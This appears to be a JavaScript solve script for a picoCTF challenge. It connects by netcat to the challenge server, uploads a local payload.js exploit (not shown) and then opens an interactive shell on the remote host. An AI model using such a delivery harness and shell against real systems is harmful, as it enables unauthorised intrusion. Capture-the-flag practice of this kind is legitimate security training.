import nc from "../nc.js";
import { shell } from "../util.js";
import { readFileSync } from "fs";

const __dirname = new URL('.', import.meta.url).pathname;

const cat = new nc("nc mercury.picoctf.net 48700");

const PAYLOAD = readFileSync(__dirname + "payload.js", "utf-8");
await cat.open;
await cat.readUntil("Provide size.")
await cat.write(PAYLOAD.length + "\n");
await cat.readUntil("Provide script")
await cat.write(PAYLOAD);

await shell(cat);